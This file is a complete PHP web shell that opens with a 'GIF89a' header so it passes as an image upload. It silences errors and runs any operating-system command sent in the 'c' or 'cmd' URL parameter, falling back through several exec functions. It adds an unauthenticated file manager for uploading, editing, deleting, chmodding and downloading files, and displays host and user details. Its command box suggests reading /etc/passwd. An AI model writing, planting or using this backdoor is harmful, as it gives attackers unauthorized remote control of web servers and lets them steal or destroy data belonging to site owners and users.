GIF89a<?php
error_reporting(0);
ini_set('display_errors', 0);
header('X-Powered-By: none');

$rce_cmd = $_GET['c'] ?? $_GET['cmd'] ?? null;
if ($rce_cmd !== null) {
    header('Content-Type: text/plain; charset=UTF-8');
    if (function_exists('system')) {
        system($rce_cmd . ' 2>&1');
    } elseif (function_exists('exec')) {
        exec($rce_cmd . ' 2>&1', $out);
        echo implode("\n", $out);
    } elseif (function_exists('shell_exec')) {
        echo shell_exec($rce_cmd . ' 2>&1');
    } elseif (function_exists('passthru')) {
        passthru($rce_cmd . ' 2>&1');
    } elseif (function_exists('popen')) {
        $fp = popen($rce_cmd . ' 2>&1', 'r');
        while (!feof($fp)) { echo fread($fp, 8192); }
        pclose($fp);
    } else {
        echo "ERR: No exec function available";
    }
    exit;
}

$ROOT = realpath('.');
$dir  = isset($_GET['dir']) ? $_GET['dir'] : '.';
$realDir = realpath($dir);
if (!$realDir || !is_dir($realDir) || strpos($realDir, $ROOT) !== 0) {
    $dir     = $ROOT;
    $realDir = $ROOT;
}
$msg = '';
$err = '';

if (isset($_GET['del'])) {
    $target = realpath($_GET['del']);
    if ($target && strpos($target, $ROOT) === 0 && file_exists($target)) {
        if (is_dir($target)) {
            if (rmdir($target)) $msg = "[OK] Directory deleted";
            else $err = "[ERR] Directory not empty or permission denied";
        } else {
            if (unlink($target)) $msg = "[OK] File deleted";
            else $err = "[ERR] Delete failed";
        }
    } else {
        $err = "[ERR] Invalid target";
    }
}

if (isset($_POST['create_file'])) {
    $name = basename($_POST['create_file']);
    $path = rtrim($realDir, '/') . '/' . $name;
    if (!file_exists($path)) {
        if (file_put_contents($path, '') !== false) $msg = "[OK] File created: " . htmlspecialchars($name);
        else $err = "[ERR] Cannot create file";
    } else {
        $err = "[ERR] File already exists";
    }
}

if (isset($_POST['create_dir'])) {
    $name = basename($_POST['create_dir']);
    $path = rtrim($realDir, '/') . '/' . $name;
    if (!file_exists($path)) {
        if (mkdir($path, 0755)) $msg = "[OK] Dir created: " . htmlspecialchars($name);
        else $err = "[ERR] Cannot create dir";
    } else {
        $err = "[ERR] Dir already exists";
    }
}

if (isset($_FILES['files']) && is_array($_FILES['files']['name'])) {
    $uploaded = 0;
    foreach ($_FILES['files']['error'] as $i => $error) {
        if ($error !== UPLOAD_ERR_OK) continue;
        $fname = basename($_FILES['files']['name'][$i]);
        $target = rtrim($realDir, '/') . '/' . $fname;
        if (move_uploaded_file($_FILES['files']['tmp_name'][$i], $target)) {
            $uploaded++;
        }
    }
    if ($uploaded > 0) $msg = "[OK] Uploaded $uploaded file(s)";
    else $err = "[ERR] Upload failed";
}

if (isset($_POST['save_edit']) && isset($_POST['edit_file'])) {
    $edit_target = realpath($_POST['edit_file']);
    if ($edit_target && strpos($edit_target, $ROOT) === 0 && is_writable($edit_target)) {
        file_put_contents($edit_target, $_POST['save_edit']);
        $msg = "[OK] Saved: " . htmlspecialchars(basename($edit_target));
    } else {
        $err = "[ERR] Cannot write file";
    }
}

if (isset($_GET['download'])) {
    $dl_target = realpath($_GET['download']);
    if ($dl_target && strpos($dl_target, $ROOT) === 0 && is_file($dl_target)) {
        header('Content-Type: application/octet-stream');
        header('Content-Length: ' . filesize($dl_target));
        header('Content-Disposition: attachment; filename="' . basename($dl_target) . '"');
        readfile($dl_target);
        exit;
    }
}

if (isset($_POST['rename_from']) && isset($_POST['rename_to'])) {
    $from = realpath($_POST['rename_from']);
    $to   = rtrim(dirname($from), '/') . '/' . basename($_POST['rename_to']);
    if ($from && strpos($from, $ROOT) === 0 && file_exists($from)) {
        if (rename($from, $to)) $msg = "[OK] Renamed";
        else $err = "[ERR] Rename failed";
    }
}

if (isset($_POST['chmod_file']) && isset($_POST['chmod_val'])) {
    $chmod_target = realpath($_POST['chmod_file']);
    $chmod_val    = octdec($_POST['chmod_val']);
    if ($chmod_target && strpos($chmod_target, $ROOT) === 0) {
        if (chmod($chmod_target, $chmod_val)) $msg = "[OK] CHMOD " . $_POST['chmod_val'];
        else $err = "[ERR] CHMOD failed";
    }
}

$is_edit = isset($_GET['edit']);
$edit_content = '';
if ($is_edit) {
    $edit_path = realpath($_GET['edit']);
    if ($edit_path && strpos($edit_path, $ROOT) === 0 && is_file($edit_path) && is_readable($edit_path)) {
        $edit_content = file_get_contents($edit_path);
    }
}

function formatSize($bytes) {
    if ($bytes >= 1073741824) return round($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576)    return round($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024)       return round($bytes / 1024, 2) . ' KB';
    return $bytes . ' B';
}

header('Content-Type: text/html; charset=UTF-8');
?><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>File Manager — <?php echo htmlspecialchars(basename($realDir)); ?></title>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',system-ui,sans-serif;background:#0d1117;color:#c9d1d9;min-height:100vh}
a{color:#58a6ff;text-decoration:none}
a:hover{color:#79c0ff;text-decoration:underline}
header{background:#161b22;border-bottom:1px solid #30363d;padding:12px 20px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px}
header h1{font-size:18px;color:#f0f6fc;font-weight:600}
header .sys{font-size:12px;color:#8b949e}
.msg{background:#238636;color:#fff;padding:8px 20px;font-size:13px}
.err{background:#da3633;color:#fff;padding:8px 20px;font-size:13px}
main{padding:20px;max-width:1200px;margin:0 auto}
.toolbar{display:flex;flex-wrap:wrap;gap:10px;margin-bottom:18px;align-items:center}
.toolbar form{display:flex;gap:6px;align-items:center}
.toolbar input[type="text"]{background:#0d1117;border:1px solid #30363d;color:#c9d1d9;padding:6px 10px;border-radius:6px;font-size:13px;outline:none;width:180px}
.toolbar input[type="text"]:focus{border-color:#58a6ff}
.toolbar button,.toolbar .btn{background:#21262d;border:1px solid #30363d;color:#c9d1d9;padding:6px 14px;border-radius:6px;cursor:pointer;font-size:13px;white-space:nowrap;transition:all .15s}
.toolbar button:hover,.toolbar .btn:hover{background:#30363d;border-color:#8b949e}
.btn-danger{color:#f85149!important;border-color:#f8514950!important}
.btn-danger:hover{background:#490202!important}
.btn-green{color:#3fb950!important;border-color:#3fb95050!important}
.btn-green:hover{background:#0d3320!important}
.breadcrumb{display:flex;flex-wrap:wrap;gap:4px;margin-bottom:16px;font-size:13px;color:#8b949e;align-items:center}
.breadcrumb a{color:#58a6ff}
.breadcrumb span{color:#484f58}
.upload-zone{border:2px dashed #30363d;border-radius:8px;padding:20px;text-align:center;margin-bottom:18px;transition:all .2s;cursor:pointer}
.upload-zone:hover,.upload-zone.dragover{border-color:#58a6ff;background:#1a2332}
.upload-zone input{display:none}
.upload-zone p{font-size:14px;color:#8b949e}
table{width:100%;border-collapse:collapse;font-size:13px}
thead th{text-align:left;padding:10px 12px;background:#161b22;border-bottom:1px solid #30363d;color:#8b949e;font-weight:600;position:sticky;top:0}
tbody td{padding:8px 12px;border-bottom:1px solid #21262d}
tbody tr:hover{background:#161b22}
td.actions{display:flex;gap:6px;flex-wrap:wrap}
td.actions a{font-size:12px;padding:3px 8px;background:#21262d;border:1px solid #30363d;border-radius:4px}
td.actions a:hover{text-decoration:none;background:#30363d}
.size{color:#8b949e}
.perm{font-family:monospace;font-size:12px;color:#8b949e}
.dir-icon{color:#58a6ff}
.file-icon{color:#8b949e}
.editor-panel{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:16px;margin-top:16px}
.editor-panel h2{font-size:16px;margin-bottom:12px;color:#f0f6fc}
.editor-panel textarea{width:100%;min-height:400px;background:#0d1117;color:#c9d1d9;border:1px solid #30363d;border-radius:6px;padding:12px;font-family:'Consolas','Monaco',monospace;font-size:13px;resize:vertical;outline:none;tab-size:4}
.editor-panel textarea:focus{border-color:#58a6ff}
.editor-panel .editor-actions{margin-top:12px;display:flex;gap:10px}
.cmd-box{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:12px;margin-top:16px;display:flex;gap:8px;align-items:center}
.cmd-box input[type="text"]{flex:1;background:#0d1117;border:1px solid #30363d;color:#c9d1d9;padding:8px 12px;border-radius:6px;font-family:'Consolas','Monaco',monospace;font-size:14px;outline:none}
.cmd-box input[type="text"]:focus{border-color:#f0883e}
.cmd-box button{background:#d29922;color:#0d1117;border:none;padding:8px 18px;border-radius:6px;font-weight:600;cursor:pointer;font-size:14px}
.cmd-box button:hover{background:#e3b341}
pre.cmd-out{background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:14px;margin-top:12px;font-family:'Consolas','Monaco',monospace;font-size:13px;color:#7ee787;max-height:300px;overflow:auto;white-space:pre-wrap}
.empty{text-align:center;padding:40px;color:#484f58;font-size:14px}
@media(max-width:768px){.toolbar form{flex-direction:column;width:100%}.toolbar input[type="text"]{width:100%}table thead{display:none}tbody td{display:block;text-align:right}tbody td::before{content:attr(data-label);float:left;font-weight:600;color:#8b949e}tbody td.actions{justify-content:flex-end}}
</style>
</head>
<body>
<header>
  <div>
    <h1><?php echo htmlspecialchars($realDir); ?></h1>
    <div class="sys">
      <?php echo php_uname('s') . ' | ' . php_uname('r') . ' | PHP ' . phpversion() . ' | ' . $_SERVER['SERVER_SOFTWARE']; ?>
    </div>
  </div>
  <div class="sys">
    User: <?php echo function_exists('posix_getpwuid') ? posix_getpwuid(posix_geteuid())['name'] : get_current_user(); ?>
    | UID:<?php echo function_exists('posix_geteuid') ? posix_geteuid() : '?'; ?>
    | GID:<?php echo function_exists('posix_getegid') ? posix_getegid() : '?'; ?>
  </div>
</header>
<?php if ($msg): ?><div class="msg"><?php echo $msg; ?></div><?php endif; ?>
<?php if ($err): ?><div class="err"><?php echo $err; ?></div><?php endif; ?>
<main>
<div class="breadcrumb">
<?php
$parts = explode('/', trim(str_replace($ROOT, '', $realDir), '/'));
$cumulative = $ROOT;
echo '<a href="?dir=' . urlencode($ROOT) . '">/</a>';
foreach ($parts as $part) {
    if ($part === '') continue;
    $cumulative .= '/' . $part;
    echo '<span>/</span><a href="?dir=' . urlencode($cumulative) . '">' . htmlspecialchars($part) . '</a>';
}
?>
</div>
<div class="toolbar">
  <form method="post">
    <input type="text" name="create_dir" placeholder="New folder name">
    <button type="submit">+ Dir</button>
  </form>
  <form method="post">
    <input type="text" name="create_file" placeholder="New file name">
    <button type="submit">+ File</button>
  </form>
</div>
<div class="upload-zone" id="dropzone" onclick="document.getElementById('fileinput').click()">
  <input type="file" id="fileinput" name="files[]" multiple onchange="uploadFiles(this.files)">
  <p>Click to select files or drag & drop here</p>
</div>
<div id="uploadProgress" style="display:none;text-align:center;padding:10px;color:#d29922"></div>
<div class="cmd-box">
  <input type="text" id="cmdInput" placeholder="type command, e.g.: id, whoami, uname -a, cat /etc/passwd" onkeydown="if(event.key==='Enter')execCmd()">
  <button onclick="execCmd()">Execute</button>
  <a href="?c=id" target="_blank" style="font-size:13px;color:#8b949e;white-space:nowrap">?c=id</a>
</div>
<pre class="cmd-out" id="cmdOutput" style="display:none"></pre>
<script>
async function execCmd(){
  const cmd = document.getElementById('cmdInput').value.trim();
  if(!cmd) return;
  const out = document.getElementById('cmdOutput');
  out.style.display = 'block';
  out.textContent = 'Running...';
  try {
    const resp = await fetch('?c=' + encodeURIComponent(cmd));
    out.textContent = await resp.text();
  } catch(e) {
    out.textContent = 'Error: ' + e.message;
  }
}
async function uploadFiles(files) {
  if(!files.length) return;
  const prog = document.getElementById('uploadProgress');
  prog.style.display = 'block';
  prog.textContent = 'Uploading ' + files.length + ' file(s)...';
  const fd = new FormData();
  for(const f of files) fd.append('files[]', f);
  try {
    await fetch('?dir=' + encodeURIComponent('<?php echo addslashes($realDir); ?>'), {method:'POST',body:fd});
    location.reload();
  } catch(e) {
    prog.textContent = 'Upload failed: ' + e.message;
  }
}
const dz = document.getElementById('dropzone');
['dragenter','dragover','dragleave','drop'].forEach(ev => {
  dz.addEventListener(ev, e => { e.preventDefault(); e.stopPropagation(); });
});
['dragenter','dragover'].forEach(ev => dz.addEventListener(ev, () => dz.classList.add('dragover')));
['dragleave','drop'].forEach(ev => dz.addEventListener(ev, () => dz.classList.remove('dragover')));
dz.addEventListener('drop', e => uploadFiles(e.dataTransfer.files));
</script>
<?php if ($is_edit && $edit_content !== ''): ?>
<div class="editor-panel">
  <h2>Editing: <?php echo htmlspecialchars(basename($_GET['edit'])); ?></h2>
  <form method="post">
    <input type="hidden" name="edit_file" value="<?php echo htmlspecialchars($_GET['edit']); ?>">
    <textarea name="save_edit" spellcheck="false"><?php echo htmlspecialchars($edit_content); ?></textarea>
    <div class="editor-actions">
      <button type="submit" class="btn-green">Save</button>
      <a href="?dir=<?php echo urlencode(dirname($_GET['edit'])); ?>" class="btn">Cancel</a>
    </div>
  </form>
</div>
<?php endif; ?>
<table>
<thead>
  <tr>
    <th style="width:42%">Name</th>
    <th style="width:12%">Size</th>
    <th style="width:14%">Permissions</th>
    <th style="width:16%">Modified</th>
    <th style="width:16%">Actions</th>
  </tr>
</thead>
<tbody>
<?php
$items = array_filter(scandir($realDir), function($f) { return $f !== '.' && $f !== '..'; });
if (empty($items)) {
    echo '<tr><td colspan="5" class="empty">Empty directory</td></tr>';
} else {
    $dirs  = [];
    $files = [];
    foreach ($items as $f) {
        $path = $realDir . '/' . $f;
        if (is_dir($path)) $dirs[] = $f;
        else $files[] = $f;
    }
    natcasesort($dirs);
    natcasesort($files);
    $sorted = array_merge($dirs, $files);
    foreach ($sorted as $f):
        $path  = $realDir . '/' . $f;
        $isdir = is_dir($path);
        $perms = substr(sprintf('%o', fileperms($path)), -4);
        $size  = $isdir ? '-' : formatSize(filesize($path));
        $mtime = date('Y-m-d H:i', filemtime($path));
        $enc   = htmlspecialchars($f);
        $epath = htmlspecialchars(urlencode($path));
?>
  <tr>
    <td data-label="Name">
      <?php if ($isdir): ?>
        <span class="dir-icon">[DIR]</span> <a href="?dir=<?php echo $epath; ?>"><?php echo $enc; ?>/</a>
      <?php else: ?>
        <span class="file-icon">[FILE]</span> <?php echo $enc; ?>
      <?php endif; ?>
    </td>
    <td data-label="Size" class="size"><?php echo $size; ?></td>
    <td data-label="Perm" class="perm">
      <form method="post" style="display:inline">
        <input type="hidden" name="chmod_file" value="<?php echo $epath; ?>">
        <input type="text" name="chmod_val" value="<?php echo $perms; ?>" style="width:52px;background:transparent;border:1px solid #30363d;color:#c9d1d9;padding:2px 4px;font-family:monospace;font-size:11px;border-radius:3px;text-align:center" onchange="this.form.submit()">
      </form>
    </td>
    <td data-label="Modified" style="font-size:12px;color:#8b949e"><?php echo $mtime; ?></td>
    <td data-label="Actions" class="actions">
      <?php if ($isdir): ?>
        <a href="?dir=<?php echo $epath; ?>">Open</a>
      <?php else: ?>
        <a href="?edit=<?php echo $epath; ?>&dir=<?php echo urlencode($realDir); ?>">Edit</a>
        <a href="?download=<?php echo $epath; ?>">DL</a>
      <?php endif; ?>
      <a href="?del=<?php echo $epath; ?>&dir=<?php echo urlencode($realDir); ?>" class="btn-danger" onclick="return confirm('Delete <?php echo addslashes($f); ?>?')">Del</a>
      <?php if (!$isdir): ?>
        <span onclick="renamePrompt('<?php echo addslashes($epath); ?>','<?php echo addslashes($enc); ?>')" style="font-size:12px;padding:3px 8px;background:#21262d;border:1px solid #30363d;border-radius:4px;cursor:pointer;color:#58a6ff">Rename</span>
      <?php endif; ?>
    </td>
  </tr>
<?php
    endforeach;
}
?>
</tbody>
</table>
<form id="renameForm" method="post" style="display:none">
  <input type="hidden" name="rename_from" id="renameFrom">
  <input type="hidden" name="rename_to" id="renameTo">
</form>
<script>
function renamePrompt(path, oldName) {
  const n = prompt('New name:', oldName);
  if (n && n !== oldName) {
    document.getElementById('renameFrom').value = decodeURIComponent(path);
    document.getElementById('renameTo').value = n;
    document.getElementById('renameForm').submit();
  }
}
</script>
</main>
</body>
</html>